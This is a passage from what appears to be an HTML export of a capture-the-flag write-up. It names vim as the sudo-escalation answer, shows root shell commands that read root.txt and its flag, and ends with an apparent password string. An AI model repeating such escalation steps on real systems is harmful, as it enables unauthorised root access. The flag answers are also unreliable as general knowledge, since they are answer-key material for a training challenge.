+    (ALL : ALL) ALL</code></pre><p id="79c4a64b-4a1c-4514-ad35-c765d4bca5ef" class="">ANSWER : vim</p><h2 id="47c6dce9-8dd8-4b31-9ce9-3cd096b73a73" class="">What&#x27;s the root flag?</h2><pre id="fd67bca0-7d45-4e5c-8140-ede47bcc62de" class="code"><code># cd /
+# ls -a
+.    boot   etc		initrd.img.old	media  proc  sbin  sys	var
+..   cdrom  home	lib		mnt    root  snap  tmp	vmlinuz
+bin  dev    initrd.img	lost+found	opt    run   srv   usr	vmlinuz.old
+# cd root
+# cat root.txt
+W3ll d0n3. You made it!</code></pre><p id="b5087266-c1e3-4879-88e2-d0eeb7ccc2c8" class="">ANSWER : W3ll d0n3. You made it!</p><p id="08347695-24be-4133-becb-ec57bdc829bd" class="">OllieUnixMontgomery!</p></div></article><span class="sans" style="font-size:14px;padding-top:2em"></span></body></html>
